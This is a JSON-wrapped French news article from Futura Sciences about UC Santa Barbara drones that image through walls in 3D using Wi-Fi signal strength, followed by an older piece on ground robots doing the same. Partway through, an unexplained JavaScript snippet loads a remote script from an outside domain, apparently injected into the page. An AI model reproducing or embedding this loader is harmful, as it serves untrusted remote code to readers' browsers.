{"title": "Des drones voient en 3D a travers les murs grace au Wi-Fi", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-06-21", "content": "Des chercheurs americains ont mis au point un systeme d'imagerie qui permet de voir en trois dimensions a travers les murs en se servant d'un simple signal Wi-Fi et de deux drones. Une avancee qui pourrait servir lors de missions de sauvetage ou a la surveillance de l'integrite des batiments. Ce qu'il faut retenir Deux drones equipes d'antennes directionnelles peuvent voir a travers les murs en se servant d'un signal Wi-Fi. La technologie pourrait servir lors de missions de recherche de victimes suite a des catastrophes naturelles mais aussi en archeologie. A l'universite de Californie de Santa Barbara (Etats-Unis), l'equipe du professeur Yasamin Mostofi travaille depuis 2010 sur une technologie d'imagerie utilisant uniquement les ondes radio  Wi-Fi . Il y a quelques annees, grace a ce procede installe sur des  robots  telecommandes, les chercheurs sont parvenus a voir a travers les  murs  pour identifier des objets, leur position et leur geometrie. Ils viennent desormais de franchir une nouvelle etape importante en reussissant a faire de l'imagerie en  3D  haute resolution, toujours en se servant d'un signal Wi-Fi, mais en remplacant les robots terrestres par des  drones . En l'occurrence, il s'agit de deux octocopteres equipes pour une navigation autonome. Dans l' article scientifique  detaillant l'experimentation, on apprend que chaque appareil est muni d'une antenne directionnelle, l'une envoyant le signal Wi-Fi, l'autre le recevant. Pour calculer leur position, les drones n'utilisent pas de  GPS  mais une tablette  Google Tango  qui leur permet de se geolocaliser en 3D avec precision. Ces informations sont transmises au controleur de l'appareil qui assure le pilotage en autonomie. En ce qui concerne les mesures effectuees a l'aide du signal Wi-Fi, elles sont realisees selon la methode RSSI ( Received Signal Strength Indication ) qui calcule la puissance en reception d'un signal recu d'une antenne. De gauche a droite, le batiment en briques que les deux drones vont scanner a l'aide d'un signal Wi-Fi RSSI, l'image 3D ideale generee par un ordinateur et le rendu produit par les appareils qui s'avere tres fidele. (c) UC Santa Barbara, Mostofi Lab                               Les drones equipes d'un mini-ordinateur Raspberry Pi L'un des drones est equipe d'un  routeur  Wi-Fi tandis que le second recoit une carte reseau sans fil ( WLAN ) reliee a un mini-ordinateur Raspberry Pi. La carte WLAN permet la mesure du signal Wi-Fi RSSI tous les deux centimetres. Les donnees sont transmises au Raspberry Pi qui les stocke puis les transfere a la  tablette  Tango une fois le parcours accompli.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Lors de leurs essais, les deux  drones  autonomes ont ete amenes a ausculter une construction en brique faite de quatre murs renfermant une autre structure dont ils n'avaient aucune connaissance prealable. En vol, le drone emetteur envoie son signal Wi-Fi qui est capte par le second appareil evoluant en opposition. Les ondes  radio  traversent la structure du batiment et sont attenuees a des degres divers selon la position et la composition des objets. Dans cette video  YouTube , on peut les voir a l'oeuvre  et constater la precision des releves. Quant aux  applications  possibles, les chercheurs evoquent des missions de recherche et de sauvetage suite a des catastrophes, de la surveillance d'infrastructures ou encore de l'exploration archeologique. Compares aux premiers essais avec des robots terrestres, les drones apportent non seulement la vision en 3D mais aussi une plus grande polyvalence sur les conditions de terrain rencontrees. Pour en savoir plus Des robots voient a travers les murs en se servant du Wi-Fi Article initial de  Marc Zaffagni  ,paru le 10/08/2014 Des robots crees par une equipe de chercheurs de l'universite de Californie a Santa Barbara peuvent voir a travers des murs et detectent les objets qui se trouvent derriere en utilisant seulement un signal Wi-Fi. Cette technologie ouvre la voie a de nombreuses applications, allant de missions de sauvetage a la surveillance des batiments en passant par la detection et l'archeologie . Imaginez des vehicules robotises arrivant devant d'epais murs en  beton . Ils n'ont aucune connaissance de ce qui se trouve derriere, mais ils sont pourtant capables de voir a travers et de detecter le moindre objet qu'ils masquent, tout cela au moyen d'un simple signal Wi-Fi. Cette technologie, denommee  X-ray vision for robots with only WiFi , a ete mise au point et brevetee par une equipe de chercheurs de l'universite de Californie a Santa Barbara. Elle permet, malgre une cloison, d'identifier les objets, leur position, leur geometrie et egalement de determiner s'il s'agit d'un humain, d'un objet en  metal  ou en  bois . En soi, la technique n'est pas nouvelle. Une methode d' imagerie par radio , avait deja ete montree en 2009. Des  robots  equipes de cette technologie pourraient notamment parcourir les decombres apres des accidents ou des  catastrophes naturelles  pour rechercher des survivants. Les robots travaillent en tandem en utilisant un  algorithme de cartographie  et localisation simultanees (en anglais  Simultaneous Localization And Mapping , ou SLAM) qui travaille a la volee. Alternativement, un engin situe d'un cote d'une structure emet un signal Wi-Fi tandis que l'autre, sur le cote oppose, capte ce signal. Les ondes radio passant a travers la zone inconnue, les objets qui s'y trouvent attenuent le signal de facon differente selon leur position et leur composition. Pour voir a travers les murs, les robots se servent d'un algorithme de cartographie et localisation simultanees. L'image au centre montre la vue en coupe de la structure. L'image de droite montre ce que voient les robots. Le pourcentage exprime le nombre de releves Wi-Fi compare au nombre total de pixels inconnus. (c) UC Santa Barbara                               Tous les appareils Wi-Fi pourraient aider a voir a travers les murs C'est en mesurant ces variations a l'aide d'un modele de propagation des ondes que le systeme parvient a cartographier une structure et son contenu en determinant ou se trouvent les objets  solides  et les espaces vides. Pour ameliorer la resolution de l'images, l'equipe de l'UC Santa Barbara a equipe ses robots d'antennes directionnelles. Le systeme, dont on peut voir une demonstration dans cette  video YouTube , ne se limite pas aux robots. <<  Cette technologie peut etre integree a n'importe quel appareil Wi-Fi  >>, expliquent les chercheurs. Elle pourrait etre utilisee avec un  reseau Wi-Fi  fixe et alors servir a surveiller un batiment ou une piece pour detecter les intrusions ou evaluer le nombre d'occupants pour, par exemple, ajuster la temperature. Les chercheurs citent encore d'autres utilisations possibles, pour la recherche archeologique ou pour detecter et repertorier des objets sans toucher a une structure. Les travaux de developpement se poursuivent afin de concevoir d'autres applications et de perfectionner la technologie. Il est notamment question d'associer le systeme a un guidage  laser  pour ameliorer la precision spatiale et la resolution de la cartographie. ", "theme": "tech"}